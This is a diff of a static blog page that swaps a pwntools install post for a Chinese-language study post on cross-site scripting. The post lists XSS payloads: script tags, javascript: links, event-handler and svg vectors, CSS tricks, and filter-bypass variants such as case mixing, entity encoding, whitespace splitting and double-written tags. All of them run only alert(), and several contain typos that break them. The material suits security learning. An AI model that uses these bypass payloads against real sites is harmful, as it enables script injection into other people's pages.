@@ -23,27 +23,29 @@
   <script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"www.hsfan.top","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="http:&#x2F;&#x2F;docs.pwntools.com&#x2F;en&#x2F;stable&#x2F;gdb.html 安装pwntools作为pip软件包提供。 1234$ apt-get update$ apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential$ python3 -m pip instal">
+<meta name="description" content="XSS的构造利用[&lt;&gt;]构造HTML&#x2F;JS可以利用[&lt;&gt;]构造HTML标签和&lt;script&gt;标签。  在测试页面提交参数[&lt;h1 style&#x3D;&#39;color:red&#39;&gt;利用[&lt;&gt;]构造HTML&#x2F;JS&lt;&#x2F;h1&gt;]  提交[&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;]">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwntool">
-<meta property="og:url" content="http://www.hsfan.top/2019/11/13/pwntools/index.html">
+<meta property="og:title" content="XSS">
+<meta property="og:url" content="http://www.hsfan.top/2021/11/11/XSS/index.html">
 <meta property="og:site_name" content="Angrily bullfighting">
-<meta property="og:description" content="http:&#x2F;&#x2F;docs.pwntools.com&#x2F;en&#x2F;stable&#x2F;gdb.html 安装pwntools作为pip软件包提供。 1234$ apt-get update$ apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential$ python3 -m pip instal">
+<meta property="og:description" content="XSS的构造利用[&lt;&gt;]构造HTML&#x2F;JS可以利用[&lt;&gt;]构造HTML标签和&lt;script&gt;标签。  在测试页面提交参数[&lt;h1 style&#x3D;&#39;color:red&#39;&gt;利用[&lt;&gt;]构造HTML&#x2F;JS&lt;&#x2F;h1&gt;]  提交[&lt;script&gt;alert(&#x2F;xss&#x2F;)&lt;&#x2F;script&gt;]">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2019-11-13T05:00:48.000Z">
-<meta property="article:modified_time" content="2021-10-15T03:28:14.784Z">
+<meta property="og:image" content="http://www.hsfan.top/2021/11/11/XSS/smile.jpg">
+<meta property="article:published_time" content="2021-11-11T03:35:22.000Z">
+<meta property="article:modified_time" content="2021-11-11T03:37:50.600Z">
 <meta property="article:author" content="Daren">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.hsfan.top/2021/11/11/XSS/smile.jpg">
 
 
-<link rel="canonical" href="http://www.hsfan.top/2019/11/13/pwntools/">
+<link rel="canonical" href="http://www.hsfan.top/2021/11/11/XSS/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://www.hsfan.top/2019/11/13/pwntools/","path":"2019/11/13/pwntools/","title":"pwntool"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://www.hsfan.top/2021/11/11/XSS/","path":"2021/11/11/XSS/","title":"XSS"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>pwntool | Angrily bullfighting</title>
+<title>XSS | Angrily bullfighting</title>
   
 
 
@@ -144,7 +146,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%AE%89%E8%A3%85"><span class="nav-number">1.</span> <span class="nav-text">安装</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%E7%9A%84%E6%9E%84%E9%80%A0"><span class="nav-number">1.</span> <span class="nav-text">XSS的构造</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-lt-gt-%E6%9E%84%E9%80%A0HTML-JS"><span class="nav-number">1.1.</span> <span class="nav-text">利用[&lt;&gt;]构造HTML&#x2F;JS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.2.</span> <span class="nav-text">伪协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%A7%E7%94%9F%E8%87%AA%E5%B7%B1%E7%9A%84%E4%BA%8B%E4%BB%B6"><span class="nav-number">1.3.</span> <span class="nav-text">产生自己的事件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8CSS%E8%B7%A8%E7%AB%99%EF%BC%88old%EF%BC%89"><span class="nav-number">1.4.</span> <span class="nav-text">利用CSS跨站（old）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E6%A0%87%E7%AD%BE%E4%BB%A5%E5%8F%8A%E6%89%8B%E6%B3%95"><span class="nav-number">1.5.</span> <span class="nav-text">其他标签以及手法</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS%E7%9A%84%E5%8F%98%E5%BD%A2"><span class="nav-number">2.</span> <span class="nav-text">XSS的变形</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E8%BD%AC%E6%8D%A2"><span class="nav-number">2.1.</span> <span class="nav-text">大小写转换</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%95%E5%8F%B7%E7%9A%84%E4%BD%BF%E7%94%A8"><span class="nav-number">2.2.</span> <span class="nav-text">引号的使用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E6%9B%BF%E7%A9%BA%E6%A0%BC"><span class="nav-number">2.3.</span> <span class="nav-text">[&#x2F;]代替空格</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9B%9E%E8%BD%A6"><span class="nav-number">2.4.</span> <span class="nav-text">回车</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AF%B9%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7%E5%80%BC%E8%BF%9B%E8%A1%8C%E8%BD%AC%E7%A0%81"><span class="nav-number">2.5.</span> <span class="nav-text">对标签属性值进行转码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CSS%E4%B8%AD%E7%9A%84%E5%8F%98%E5%BD%A2"><span class="nav-number">2.6.</span> <span class="nav-text">CSS中的变形</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-number">2.7.</span> <span class="nav-text">双写绕过</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -217,7 +219,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://www.hsfan.top/2019/11/13/pwntools/">
+    <link itemprop="mainEntityOfPage" href="http://www.hsfan.top/2021/11/11/XSS/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -230,7 +232,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          pwntool
+          XSS
         </h1>
 
         <div class="post-meta-container">
@@ -240,16 +242,10 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2019-11-13 13:00:48" itemprop="dateCreated datePublished" datetime="2019-11-13T13:00:48+08:00">2019-11-13</time>
+      <time title="创建时间：2021-11-11 11:35:22 / 修改时间：11:37:50" itemprop="dateCreated datePublished" datetime="2021-11-11T11:35:22+08:00">2021-11-11</time>
     </span>
-      <span class="post-meta-item">
-        <span class="post-meta-item-icon">
-          <i class="far fa-calendar-check"></i>
-        </span>
-        <span class="post-meta-item-text">更新于</span>
-        <time title="修改时间：2021-10-15 11:28:14" itemprop="dateModified" datetime="2021-10-15T11:28:14+08:00">2021-10-15</time>
-      </span>
 
   
     <span class="post-meta-item" title="阅读次数">
@@ -268,10 +264,106 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <p><a target="_blank" rel="noopener" href="http://docs.pwntools.com/en/stable/gdb.html">http://docs.pwntools.com/en/stable/gdb.html</a></p>
-<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>pwntools作为<code>pip</code>软件包提供。</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get update</span><br><span class="line">$ apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">$ python3 -m pip install --upgrade pip</span><br><span class="line">$ python3 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure>
+        <h3 id="XSS的构造"><a href="#XSS的构造" class="headerlink" title="XSS的构造"></a>XSS的构造</h3><h4 id="利用-lt-gt-构造HTML-JS"><a href="#利用-lt-gt-构造HTML-JS" class="headerlink" title="利用[&lt;&gt;]构造HTML/JS"></a>利用[&lt;&gt;]构造HTML/JS</h4><pre><code>可以利用[&lt;&gt;]构造HTML标签和&lt;script&gt;标签。
 
+在测试页面提交参数[&lt;h1 style=&#39;color:red&#39;&gt;利用[&lt;&gt;]构造HTML/JS&lt;/h1&gt;]
+
+提交[&lt;script&gt;alert(/xss/)&lt;/script&gt;] 
+</code></pre>
+<span id="more"></span>
+<h4 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h4><pre><code>也可以使用javascript:伪协议的方式构建XSS
+[javacript:alert(/xss/);]
+提交参数[&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;touch me!&lt;/a&gt;],然后点击超链接，即可触发XSS
+也可以使用img标签的伪协议，但是这种方法再IE6下测试成功。[&lt;img src=&quot;javacript:alert(&#39;xss&#39;)&quot;]
+</code></pre>
+<h4 id="产生自己的事件"><a href="#产生自己的事件" class="headerlink" title="产生自己的事件"></a>产生自己的事件</h4><pre><code>&quot;事件驱动&quot;是一种比较经典的编程思想。在网页中会发生很多事情（比如鼠标移动，键盘输入等），JS可以对这些时间进行响应。所以我们可以通过事件触发JS函数，触发XSS。
+</code></pre>
+<ul>
+<li><p>事件种类</p>
+<p>  windows事件         对windows对象触发事件<br>  form事件            HTML表单内的动作触发事件<br>  Keyboard事件        键盘按键<br>  Mouse事件        由鼠标触发额事件<br>  Media事件        由多媒体触发的事件</p>
+</li>
+</ul>
+<blockquote>
+<p>如，[<img data-src='./smile.jpg' onmouseover='alert(/xss/)'>]<br>这个标签会引入一个图片，然后鼠标悬停在图片商的时候，会触发一个XSS代码</p>
+</blockquote>
+<blockquote>
+<p>鼠标点击事件，<br>[<input type="text" onkeydown="alert(/xss/)">]<br>当点击键盘任意一个键来触发<br>常用<br>[&lt;inpuut type=”text onkeyup=”alert(/xss/)”&gt;]<br>按钮： [<input type="button" onclick="alert(/xss/)">]<br>[&lt;immg src =’#’ onerror]]’slert(/xss/)’&gt;]</p>
+</blockquote>
+<h4 id="利用CSS跨站（old）"><a href="#利用CSS跨站（old）" class="headerlink" title="利用CSS跨站（old）"></a>利用CSS跨站（old）</h4><ul>
+<li><p>可以利用CSS（层叠样式脚本）触发XSS，但是这种方法比较古老，基本上不适合现在主流的浏览器，但是从学习的角度，我们需要了解这种类型的XSS</p>
+<p>  1、行内样式<br>  [&lt;div style==”background-image:url(javascript；alert（/xss/))”&gt;]</p>
+<p>  2、页内样式<br>  [<style>Body{backgroung-image:url(javascript:alert(/xss))}</style>]</p>
+<p>  3、外部样式<br>  [<link rel="stylesheet" typ="text/css" href="./xss.css"><div>hello<div>]</p>
+</li>
+</ul>
+<h4 id="其他标签以及手法"><a href="#其他标签以及手法" class="headerlink" title="其他标签以及手法"></a>其他标签以及手法</h4><pre><code>可以用其他标签触发XSS、
+
+svg[&lt;svg onload=&quot;alert(/xss/)&quot;&gt;]这个语句比较简洁
+
+聚焦：[&lt;input onfoocus=alert(//xss/) aotofocus&gt;]
+</code></pre>
+<h3 id="XSS的变形"><a href="#XSS的变形" class="headerlink" title="XSS的变形"></a>XSS的变形</h3><pre><code>可以构造XSS代码进行各种变形，以绕过XSS过滤器的检测。变性方式主要由以下几种
+</code></pre>
+<h4 id="大小写转换"><a href="#大小写转换" class="headerlink" title="大小写转换"></a>大小写转换</h4><pre><code>可以将payload进行大小写转化
+
+[&lt;Img sRc=&#39;#&#39; Onerror=&quot;alert(//xss/)&quot; /&gt;]
+
+&lt;a hREf=&quot;javaScript:alert(/xss/)&quot;&gt;clik me &lt;/a&gt;
+</code></pre>
+<h4 id="引号的使用"><a href="#引号的使用" class="headerlink" title="引号的使用"></a>引号的使用</h4><pre><code>HTML语言中对引导的使用不敏感，但是某些过滤函数是&quot;锱铢必较&quot;
+
+&lt;img src=&quot;#&quot; javaScript:alert(/xss/)&quot;/&gt;
+
+&lt;img src=&#39;#&#39; onerror=alert(/xss/)/&gt;
+
+&lt;img ser=# onerror=alert(/xss/)/&gt;
+</code></pre>
+<h4 id="代替空格"><a href="#代替空格" class="headerlink" title="[/]代替空格"></a>[/]代替空格</h4><ul>
+<li><p>可以利用左斜线代替空格</p>
+<p>  &lt;Img/sRc=’#’/Onerror=’alert(/xss/)’&gt;</p>
+</li>
+</ul>
+<h4 id="回车"><a href="#回车" class="headerlink" title="回车"></a>回车</h4><ul>
+<li><p>我们可以在一些位置添加TAB（水平制表符）和回车符，绕过关键字检测</p>
+<p>  &lt;Img/sRc=’#’/Onerror    =’alert(/xss/)’/&gt;</p>
+<p>  <A hREf="j
+  a    v
+  a    s
+  c    r
+  i    p
+  t    :
+  alert(/xss/)">clik me!</a></p>
+</li>
+</ul>
+<h4 id="对标签属性值进行转码"><a href="#对标签属性值进行转码" class="headerlink" title="对标签属性值进行转码"></a>对标签属性值进行转码</h4><ul>
+<li>可以对标签属性进行转码，用来绕过过滤</li>
+</ul>
+<p>字母        SCLL码    十进制编码    十六进制编码<br>a        97        &amp;#97            &amp;#x61<br>e        101        &amp;#101            &amp;#65</p>
+<pre><code>&lt;A hREf=&quot;j&amp;#97;v&amp;#x61;script:alert(/xss/)&quot;&gt;click me!&lt;/a&gt;
+</code></pre>
+<ul>
+<li><p>另外可以将以下字符插入到任意位置</p>
+<p>  TAB        &amp;#9<br>  换行        &amp;#10<br>  回车        &amp;#13</p>
+</li>
+<li><p>可以将以下字符插入到头部位置</p>
+</li>
+</ul>
+<pre><code>SOH        &amp;#01
+STX        &amp;#02
+</code></pre>
+<ul>
+<li><p>拆分跨站</p>
+  <script>z='alert'</script>
+  <script>z+'(/xss/)'</script>
+  <script>eval(z)</script></li>
+</ul>
+<h4 id="CSS中的变形"><a href="#CSS中的变形" class="headerlink" title="CSS中的变形"></a>CSS中的变形</h4><h4 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h4><ul>
+<li><p>一次过滤的绕过</p>
+</li>
+<li><script>
+
+  <scr<scriptipt></li>
+</ul>
 
     </div>
 
@@ -289,7 +381,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="http://www.hsfan.top/2019/11/13/pwntools/" title="pwntool">http://www.hsfan.top/2019/11/13/pwntools/</a>
+      <a href="http://www.hsfan.top/2021/11/11/XSS/" title="XSS">http://www.hsfan.top/2021/11/11/XSS/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -302,14 +394,11 @@
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/2019/11/13/scapy/" rel="prev" title="Scapy">
-                  <i class="fa fa-chevron-left"></i> Scapy
+                <a href="/2021/10/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="prev" title="信息收集">
+                  <i class="fa fa-chevron-left"></i> 信息收集
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/2019/11/13/pcap%E6%96%87%E4%BB%B6/" rel="next" title="pcap文件">
-                  pcap文件 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
@@ -375,7 +464,7 @@
 
 
   <script src="https://cdn.jsdelivr.net/npm/quicklink@2.2.0/dist/quicklink.umd.js" integrity="sha256-4kQf9z5ntdQrzsBC3YSHnEz02Z9C1UeW/E9OgnvlzSY=" crossorigin="anonymous"></script>
-  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"http://www.hsfan.top/2019/11/13/pwntools/"}</script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"http://www.hsfan.top/2021/11/11/XSS/"}</script>
   <script src="/js/third-party/quicklink.js"></script>
 
 </body>
